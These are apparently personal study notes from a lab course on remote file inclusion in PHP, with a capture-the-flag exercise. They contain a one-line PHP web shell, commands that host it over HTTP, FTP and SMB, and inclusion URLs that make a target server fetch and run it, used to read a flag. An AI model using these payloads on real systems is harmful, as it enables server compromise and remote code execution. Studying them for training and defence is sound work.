
# RFI
 >if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
 >	1.  Enumerating local-only ports and web applications (i.e. SSRF)
 >	2.  Gaining remote code execution by including a malicious script that we host
 
 ---
## Local vs. Remote File Inclusion
>When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution. If we refer to the table on the first section, we see that the following are some of the functions that (if vulnerable) would allow RFI:

![[Pasted image 20230305181408.png]]
 However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:

1.  The vulnerable function may not allow including remote URLs
2.  You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
3.  The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

---
## Verify RFI
>any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI

 a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL` to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (`http://127.0.0.1:80/index.php`) as our input string and see if it gets included:
 `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
 
---
## Remote Code Execution with RFI
The first step in gaining remote code execution is creating a malicious script in the language of the web application
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like `80` or `443`, as these ports may be whitelisted
Start webserver using python:
```bash
sudo python3 -m http.server <LISTENING_PORT>
```
Then access our file from the RFI
`http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
![[Pasted image 20230305182007.png]]

---
## FTP

we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:

```bash
sudo python -m pyftpdlib -p 21
```
`http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
![[Pasted image 20230305182130.png]]
If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

---
## SMB
>If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation as we can utilize the SMB protocol for the remote file inclusion

spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
```bash
impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
`http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami`
![[Pasted image 20230305182340.png]]

---
## Exercise

>**Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /**

creating shell.php
`echo '<?php system($_GET["cmd"]); ?>' > shell.php`
![[Pasted image 20230305184441.png]]

start http server
`sudo python3 -m http.server 80`
![[Pasted image 20230305184210.png]]
then test if we have RFI using `http://` 
![[Pasted image 20230305184158.png]]
`http://10.129.29.114/index.php?language=http://10.10.16.19/shell.php&cmd=id`
![[Pasted image 20230305184521.png]]

under /exercise we found the flag
`http://10.129.29.114/index.php?language=http://10.10.16.19/shell.php&cmd=ls%20/exercise`
![[Pasted image 20230305184615.png]]
`http://10.129.29.114/index.php?language=http://10.10.16.19/shell.php&cmd=cat%20/exercise/flag.txt`
![[Pasted image 20230305184638.png]]
